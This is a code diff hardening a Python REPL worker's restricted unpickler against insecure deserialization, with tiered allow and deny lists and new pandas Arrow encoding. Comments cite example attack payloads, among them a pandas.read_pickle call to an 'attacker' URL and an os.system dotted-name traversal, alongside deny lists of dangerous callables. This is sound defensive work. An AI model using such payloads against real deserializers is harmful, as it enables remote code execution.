@@ -20,6 +20,7 @@ from __future__ import annotations
 import base64
 import io as _io
 import json
+import logging
 import pickle
 import struct
 import sys
@@ -27,6 +28,8 @@ import types
 from typing import Any, BinaryIO, Literal, Optional
 
 from pydantic import BaseModel, Field, model_validator
+
+logger = logging.getLogger(__name__)
 
 # 4-byte, big-endian, unsigned length prefix — never newline-delimited JSON,
 # since REPL output frequently embeds newlines (Key Constraint).
@@ -41,7 +44,12 @@ _PICKLE_MARKER = "__repl_worker_pickle_b64__"
 #: below. This matters because pyarrow-backed columns (pandas 3's default `str`
 #: dtype, `ArrowDtype`) pickle through `pyarrow.lib`, which the guard refuses.
 _ARROW_MARKER = "__repl_worker_arrow_b64__"
-_ARROW_KINDS = frozenset({"dataframe", "series"})
+_ARROW_KINDS = frozenset({"dataframe", "series", "index", "multiindex", "array"})
+#: Kinds whose Arrow columns are labelled by position, their real name (if
+#: any) travelling in the payload's ``name`` field instead.
+_POSITIONAL_ARROW_KINDS = frozenset({"index", "multiindex", "array"})
+#: Optional payload keys a decoder accepts alongside the marker and the kind.
+_ARROW_PAYLOAD_KEYS = frozenset({_ARROW_MARKER, "kind", "name"})
 
 # ---------------------------------------------------------------------------
 # Insecure-deserialization guard (code-review finding, post-TASK-1945)
@@ -74,6 +82,24 @@ _ARROW_KINDS = frozenset({"dataframe", "series"})
 # unpickling a value shaped like a DataFrame/ndarray/plain container still
 # works; unpickling a `__reduce__` payload that would call an arbitrary
 # executable does not.
+#
+# The allowlist is deliberately expressed at three granularities, from
+# coarsest to finest, because the analysis libraries this agent exists to
+# drive are not uniformly safe:
+#
+#   * `_SAFE_PICKLE_TOP_LEVEL_MODULES` — whole packages whose every member
+#     is data (or close enough that no member is a filesystem/network/
+#     interpreter capability).
+#   * `_SAFE_PICKLE_MODULE_PREFIXES` — one safe *region* of a package whose
+#     top level is NOT safe (e.g. `scipy.sparse` is data, `scipy.io` writes
+#     files).
+#   * `_SAFE_PICKLE_QUALIFIED_NAMES` — single `module.name` pairs, used for
+#     `pyarrow.lib`, which mixes pickle's reconstructor functions in with
+#     `OSFile`/`memory_map` in one module and so can only be opened safely
+#     one symbol at a time.
+#
+# `_UNSAFE_BUILTINS` / `_UNSAFE_QUALIFIED_NAMES` then subtract the dangerous
+# members that survive an otherwise-legitimate allow.
 _SAFE_PICKLE_TOP_LEVEL_MODULES = frozenset(
     {
         "pandas",
@@ -87,8 +113,106 @@ _SAFE_PICKLE_TOP_LEVEL_MODULES = frozenset(
         # namespace, e.g. `report_directory` (code-review fix, discovered via
         # `snapshot()` on a freshly-bootstrapped worker).
         "pathlib",
+        # Data-only stdlib types that routinely reach the host from a
+        # PandasAgent namespace: `re.compile(...)` patterns held as helper
+        # variables, `uuid4()` surrogate keys, `Fraction` ratios, and the
+        # `zoneinfo.ZoneInfo` that every tz-aware pandas timestamp carries
+        # inside its dtype. None of these modules exposes a member that
+        # touches the filesystem, the network, or the interpreter.
+        "re",
+        "uuid",
+        "fractions",
+        "zoneinfo",
     }
 )
+
+#: Safe *regions* of packages whose top level also exposes IO entry points.
+#: A module matches when it equals the prefix or continues it with a dot, so
+#: `"scipy.sparse"` admits `scipy.sparse._csr` but never `scipy.sparsetools`.
+#: Every package here is one the sandbox's own import gate already allows
+#: (`parrot.security.python_sanitizer._GENERAL_IMPORTS`), so refusing their
+#: values on the way back would make them importable but unusable.
+#: The analysis packages the sandbox's own import gate already allows the
+#: LLM to use. Their *sub*modules hold the result objects an agent produces —
+#: sparse matrices, fitted estimators, interpolators, chart specifications,
+#: polars frames — and refusing those on the way back would leave the
+#: libraries importable but their outputs unusable. Each package's top level
+#: is excluded (that is where `read_csv`/`scan_csv` sit), and the IO regions
+#: inside them are subtracted again by :data:`_UNSAFE_MODULE_PREFIXES`.
+_SAFE_PICKLE_MODULE_PREFIXES: tuple[str, ...] = (
+    "scipy",
+    "sklearn",
+    "altair",
+    "plotly",
+    "polars",
+)
+
+#: Regions INSIDE an allowed package that are refused anyway, because they
+#: read or write files, fetch over the network, or (worst) re-expose an
+#: unrestricted unpickler. Checked before the allow tiers.
+_UNSAFE_MODULE_PREFIXES: tuple[str, ...] = (
+    # `joblib.load` is `pickle.load` without a guard — reachable as
+    # `sklearn.utils._joblib.load`, which would route around this whole file.
+    "sklearn.utils._joblib",
+    "sklearn.externals",
+    # Downloads to disk.
+    "sklearn.datasets",
+    # `savemat`/`mmread`/`wavfile` — file IO.
+    "scipy.io",
+    "scipy.datasets",
+    # Renderer entry points that write files.
+    "plotly.io",
+    "altair.utils.save",
+    "polars.io",
+)
+
+#: Individual `module.name` pairs allowed although their module as a whole is
+#: not. `pyarrow.lib` is the entire reason this tier exists: under pandas 3
+#: the default string dtype is pyarrow-backed, so ordinary values (a string
+#: `Index`, `Series.unique()`, a groupby object) pickle through these
+#: reconstructors — while the same module also holds `OSFile`,
+#: `memory_map` and `create_memory_map`, which a `__reduce__` payload could
+#: use to read or truncate a host file. Allowing the reconstructors by name
+#: keeps the data path open and the capabilities shut.
+#:
+#: This list was derived by recording every `pyarrow` symbol `pickle` resolves
+#: across the Arrow-backed dtypes pandas can produce (string/large_string,
+#: int/float/bool, decimal128, date32, time64, timestamp-with-tz, duration,
+#: list, struct, dictionary, binary, null) plus bare `pa.Array`,
+#: `ChunkedArray`, `Table`, `RecordBatch`, `Schema`, `Field` and `Scalar`.
+#: A value needing a symbol outside it still fails closed, and the refusal
+#: message names the symbol — extending this set is then a one-line change.
+_SAFE_PICKLE_QUALIFIED_NAMES = frozenset(
+    {
+        f"pyarrow.lib.{name}"
+        for name in (
+            # Reconstructors proper.
+            "_restore_array",
+            "_restore_buffer",
+            "_reconstruct_record_batch",
+            "_reconstruct_table",
+            "chunked_array",
+            "py_buffer",
+            "scalar",
+            "schema",
+            "field",
+            # Type factories reached while rebuilding a value's dtype.
+            "type_for_alias",
+            "decimal128",
+            "decimal256",
+            "dictionary",
+            "list_",
+            "large_list",
+            "map_",
+            "struct",
+            "timestamp",
+            "time32",
+            "time64",
+            "duration",
+        )
+    }
+)
+
 #: Builtins that ARE data-only-module members but are dangerous as callables
 #: if a `__reduce__` payload resolves to them (e.g. `(eval, ("...",))`).
 _UNSAFE_BUILTINS = frozenset(
@@ -110,6 +234,59 @@ _UNSAFE_BUILTINS = frozenset(
     }
 )
 
+#: Dangerous callables that live inside an otherwise-allowed module. The
+#: sharpest is `pandas.read_pickle`: it is reachable under the `"pandas"`
+#: allow, takes a path OR a URL, and hands the bytes to an *unrestricted*
+#: `pickle.load` — so a `(pandas.read_pickle, ("http://attacker/x.pkl",))`
+#: payload would route straight around this guard. The sandbox's own gate
+#: already denies these names to the LLM (`_PANDAS_IO_NAMES` in
+#: `parrot.security.python_sanitizer`); the guard must deny them too, because
+#: a pickle payload never passes through that gate.
+_UNSAFE_QUALIFIED_NAMES = frozenset(
+    {
+        "pandas.read_pickle",
+        "pandas.to_pickle",
+        "pandas.io.pickle.read_pickle",
+        "pandas.io.pickle.to_pickle",
+        "pandas.read_csv",
+        "pandas.read_table",
+        "pandas.read_json",
+        "pandas.read_parquet",
+        "pandas.read_feather",
+        "pandas.read_excel",
+        "pandas.read_html",
+        "pandas.read_sql",
+        "pandas.read_sql_query",
+        "pandas.read_sql_table",
+        "pandas.eval",
+        "numpy.load",
+        "numpy.fromfile",
+        "numpy.lib.format.read_array",
+        "numpy.testing._private.utils.runstring",
+    }
+)
+
+
+def _matches_prefix(module: str, prefixes: tuple[str, ...], *, include_self: bool) -> bool:
+    """Whether *module* falls inside one of *prefixes*.
+
+    Matching is always on the dot boundary, never a bare ``startswith``, so
+    ``scipy.sparse`` never admits a ``scipy.sparsetools``.
+
+    Args:
+        module: The dotted module path pickle asked to resolve.
+        prefixes: Dotted package prefixes to test against.
+        include_self: Whether a module equal to a prefix matches. The DENY
+            tier passes ``True`` — ``scipy.io`` is itself the dangerous
+            module. The ALLOW tier passes ``False``, which keeps a bare
+            top-level ``polars``/``scipy`` (where ``read_csv`` and friends
+            live) outside the allow while still admitting their submodules.
+
+    Returns:
+        ``True`` when ``module`` matches one of ``prefixes``.
+    """
+    return any(module.startswith(f"{prefix}.") or (include_self and module == prefix) for prefix in prefixes)
+
 
 class _RestrictedUnpickler(pickle.Unpickler):
     """Unpickler that only resolves classes/functions under a safe allowlist.
@@ -118,18 +295,48 @@ class _RestrictedUnpickler(pickle.Unpickler):
     """
 
     def find_class(self, module: str, name: str) -> Any:  # noqa: D102 - see class docstring
-        top_level = module.split(".", 1)[0]
-        if top_level not in _SAFE_PICKLE_TOP_LEVEL_MODULES:
+        qualified = f"{module}.{name}"
+        # Attribute traversal first — this one defeats every other check.
+        # Under protocol >= 4, `pickle` resolves a DOTTED `name` by walking
+        # attributes from the module (`_getattribute`), so an allowlisted
+        # module that merely *imports* another one re-exports its whole
+        # surface: `("pandas.io.common", "os.system")` is admitted by any
+        # check that only looks at `module`, and then runs a shell command.
+        # Verified exploitable against the module-only allowlist. No value
+        # the REPL legitimately produces needs a dotted name, so refuse the
+        # whole shape rather than trying to enumerate reachable attributes.
+        if "." in name:
             raise pickle.UnpicklingError(
-                f"repl_worker: refusing to unpickle {module}.{name} "
-                "(insecure-deserialization guard — module not on the allowlist)"
+                f"repl_worker: refusing to unpickle {qualified} "
+                "(insecure-deserialization guard — dotted attribute traversal)"
+            )
+        # Denials next: a name on the unsafe lists is refused no matter which
+        # tier would otherwise admit it.
+        if qualified in _UNSAFE_QUALIFIED_NAMES:
+            raise pickle.UnpicklingError(
+                f"repl_worker: refusing to unpickle {qualified} "
+                "(insecure-deserialization guard — dangerous callable)"
             )
         if module == "builtins" and name in _UNSAFE_BUILTINS:
             raise pickle.UnpicklingError(
                 f"repl_worker: refusing to unpickle builtins.{name} "
                 "(insecure-deserialization guard — dangerous builtin)"
             )
-        return super().find_class(module, name)
+        if _matches_prefix(module, _UNSAFE_MODULE_PREFIXES, include_self=True):
+            raise pickle.UnpicklingError(
+                f"repl_worker: refusing to unpickle {qualified} "
+                "(insecure-deserialization guard — IO region of an allowed package)"
+            )
+        if module.split(".", 1)[0] in _SAFE_PICKLE_TOP_LEVEL_MODULES:
+            return super().find_class(module, name)
+        if _matches_prefix(module, _SAFE_PICKLE_MODULE_PREFIXES, include_self=False):
+            return super().find_class(module, name)
+        if qualified in _SAFE_PICKLE_QUALIFIED_NAMES:
+            return super().find_class(module, name)
+        raise pickle.UnpicklingError(
+            f"repl_worker: refusing to unpickle {qualified} "
+            "(insecure-deserialization guard — module not on the allowlist)"
+        )
 
 
 def _safe_pickle_loads(data: bytes) -> Any:
@@ -148,38 +355,87 @@ def _safe_pickle_loads(data: bytes) -> Any:
     return _RestrictedUnpickler(_io.BytesIO(data)).load()
 
 
+def _json_safe_name(name: Any) -> Any:
+    """Coerce an Index/MultiIndex name to something the JSON frame can carry.
+
+    Args:
+        name: An index name, or the list of names of a MultiIndex.
+
+    Returns:
+        ``name`` unchanged when it is already JSON-native (or a list of
+        JSON-native values), ``str(name)`` otherwise.
+    """
+    if name is None or isinstance(name, (bool, int, float, str)):
+        return name
+    if isinstance(name, (list, tuple)):
+        return [_json_safe_name(part) for part in name]
+    return str(name)
+
+
 def _encode_arrow(value: Any) -> Optional[dict[str, Any]]:
-    """Encode a DataFrame or Series as a base64 Arrow IPC stream.
+    """Encode a pandas value as a base64 Arrow IPC stream.
+
+    Covers every pandas container that can hold a pyarrow-backed array:
+    ``DataFrame``, ``Series``, ``Index``/``MultiIndex`` and a bare
+    ``ExtensionArray``. That breadth is the point — under pandas 3 the
+    default string dtype is pyarrow-backed, so values as ordinary as
+    ``df.columns`` or ``df["col"].unique()`` carry pyarrow internals. Pickling
+    those reaches ``pyarrow.lib``, which the restricted unpickler admits only
+    one reconstructor at a time; Arrow IPC is data-only, so a value routed
+    here never consults the guard at all.
 
     Args:
         value: Any namespace value.
 
     Returns:
-        ``{_ARROW_MARKER: <b64>, "kind": "dataframe"|"series"}``, or ``None``
-        when ``value`` is not a DataFrame/Series or Arrow cannot represent it
-        (the caller then falls back to pickle).
+        ``{_ARROW_MARKER: <b64>, "kind": ..., "name": ...}``, or ``None`` when
+        ``value`` is not an Arrow-carryable pandas object or Arrow cannot
+        represent it (the caller then falls back to pickle).
     """
     # Lazy: if pandas was never imported, `value` cannot be a pandas object —
     # this keeps light paths (plain lists/dicts) from paying for the import.
     pd = sys.modules.get("pandas")
-    if pd is None or not isinstance(value, (pd.DataFrame, pd.Series)):
+    if pd is None:
+        return None
+
+    name: Any = None
+    if isinstance(value, pd.DataFrame):
+        kind, frame = "dataframe", value
+    elif isinstance(value, pd.Series):
+        kind, frame = "series", value.to_frame()
+    elif isinstance(value, pd.MultiIndex):
+        kind, name = "multiindex", _json_safe_name(list(value.names))
+        frame = value.to_frame(index=False)
+    elif isinstance(value, pd.Index):
+        kind, name = "index", _json_safe_name(value.name)
+        frame = value.to_frame(index=False)
+    elif isinstance(value, pd.api.extensions.ExtensionArray):
+        kind, frame = "array", pd.DataFrame({"0": value})
+    else:
         return None
 
     import pyarrow as pa
 
-    kind = "series" if isinstance(value, pd.Series) else "dataframe"
-    frame = value.to_frame() if kind == "series" else value
+    if kind in _POSITIONAL_ARROW_KINDS:
+        # Arrow field names must be strings, and an Index's own name is
+        # carried in the payload instead — so label the columns by position.
+        frame = frame.copy()
+        frame.columns = [str(position) for position in range(frame.shape[1])]
+
     try:
         table = pa.Table.from_pandas(frame)
         sink = pa.BufferOutputStream()
         with pa.ipc.new_stream(sink, table.schema) as writer:
             writer.write_table(table)
-    except (pa.ArrowInvalid, pa.ArrowNotImplementedError, pa.ArrowTypeError):
+    except (pa.ArrowException, ValueError, TypeError):
         return None
-    return {
+    payload = {
         _ARROW_MARKER: base64.b64encode(sink.getvalue().to_pybytes()).decode("ascii"),
         "kind": kind,
     }
+    if name is not None:
+        payload["name"] = name
+    return payload
 
 
 def _without_arrow_dtypes(value: Any) -> Any:
@@ -198,20 +454,35 @@ def _without_arrow_dtypes(value: Any) -> Any:
         ``value`` itself, or an ``object``-dtype copy of a DataFrame/Series.
     """
     pd = sys.modules.get("pandas")
-    if pd is None or not isinstance(value, (pd.DataFrame, pd.Series)):
+    if pd is None:
         return value
 
     def _arrow_backed(dtype: Any) -> bool:
-        return isinstance(dtype, pd.ArrowDtype) or (
-            isinstance(dtype, pd.StringDtype) and dtype.storage == "pyarrow"
-        )
+        if isinstance(dtype, pd.ArrowDtype):
+            return True
+        if isinstance(dtype, pd.StringDtype):
+            return dtype.storage == "pyarrow"
+        # A Categorical is not itself pyarrow-backed, but under pandas 3 its
+        # `.categories` Index usually is — and pickling the dtype pickles the
+        # categories with it.
+        if isinstance(dtype, pd.CategoricalDtype):
+            return dtype.categories is not None and _arrow_backed(dtype.categories.dtype)
+        return False
 
     def _plain_index(index: Any) -> Any:
         if isinstance(index, pd.MultiIndex):
-            return index.set_levels(
-                [lvl.astype(object) if _arrow_backed(lvl.dtype) else lvl for lvl in index.levels]
-            )
+            return index.set_levels([lvl.astype(object) if _arrow_backed(lvl.dtype) else lvl for lvl in index.levels])
         return index.astype(object) if _arrow_backed(index.dtype) else index
+
+    # Values Arrow declined to carry can still be a bare Index or extension
+    # array (e.g. an object-dtype Index holding unpicklable members); scrub
+    # those the same way rather than letting pyarrow internals into the pickle.
+    if isinstance(value, pd.Index):
+        return _plain_index(value)
+    if isinstance(value, pd.api.extensions.ExtensionArray):
+        return value.astype(object) if _arrow_backed(value.dtype) else value
+    if not isinstance(value, (pd.DataFrame, pd.Series)):
+        return value
 
     result = value.copy()
     if isinstance(result, pd.Series):
@@ -246,14 +517,28 @@ def _decode_arrow(payload: dict[str, Any]) -> Any:
     if not isinstance(encoded, str):
         raise ValueError("repl_worker: arrow payload must be a base64 string")
 
+    import pandas as pd
     import pyarrow as pa
 
     frame = pa.ipc.open_stream(base64.b64decode(encoded, validate=True)).read_all().to_pandas()
+    if kind == "dataframe":
+        return frame
+    if kind == "multiindex":
+        index = pd.MultiIndex.from_frame(frame)
+        names = payload.get("name")
+        return index.set_names(names) if isinstance(names, list) else index
+
+    if frame.shape[1] != 1:
+        raise ValueError(f"repl_worker: arrow {kind} payload must have exactly one column")
+    column = frame.iloc[:, 0]
     if kind == "series":
-        if frame.shape[1] != 1:
-            raise ValueError("repl_worker: arrow series payload must have exactly one column")
-        return frame.iloc[:, 0]
-    return frame
+        return column
+    if kind == "array":
+        return column.array
+    # `.rename()`, not `pd.Index(column, name=...)`: the latter inherits the
+    # carrier column's positional label ("0") when no name was recorded,
+    # which would turn an unnamed Index into one named "0".
+    return pd.Index(column).rename(payload.get("name"))
 
 
 def encode_value(value: Any) -> Any:
@@ -308,7 +593,7 @@ def decode_value(value: Any) -> Any:
     Returns:
         The original Python value (unpickled if it was pickle-wrapped).
     """
-    if isinstance(value, dict) and set(value) == {_ARROW_MARKER, "kind"}:
+    if isinstance(value, dict) and _ARROW_MARKER in value and set(value) <= _ARROW_PAYLOAD_KEYS:
         return _decode_arrow(value)
     if isinstance(value, dict) and set(value) == {_PICKLE_MARKER}:
         return _safe_pickle_loads(base64.b64decode(value[_PICKLE_MARKER]))
@@ -317,6 +602,31 @@ def decode_value(value: Any) -> Any:
     if isinstance(value, list):
         return [decode_value(v) for v in value]
     return value
+
+
+def decode_snapshot(data: dict[str, Any]) -> dict[str, Any]:
+    """Decode a ``SnapshotResponse.data`` mapping one entry at a time.
+
+    One value the insecure-deserialization guard refuses (e.g. an altair
+    ``Chart``, whose pickle references a module outside the allowlist) must
+    not cost the caller every other variable. Such an entry is replaced by an
+    inert placeholder string and a warning is logged; no object is ever
+    constructed for it. Any other exception propagates unchanged.
+
+    Args:
+        data: The worker's ``{name: encode_value(value)}`` mapping.
+
+    Returns:
+        ``{name: decoded value or placeholder}``.
+    """
+    decoded: dict[str, Any] = {}
+    for name, value in data.items():
+        try:
+            decoded[name] = decode_value(value)
+        except pickle.UnpicklingError as exc:
+            logger.warning("repl_worker snapshot: variable %r not transportable: %s", name, exc)
+            decoded[name] = f"<{name}: refused by insecure-deserialization guard (not transportable)>"
+    return decoded
 
 
 # ---------------------------------------------------------------------------
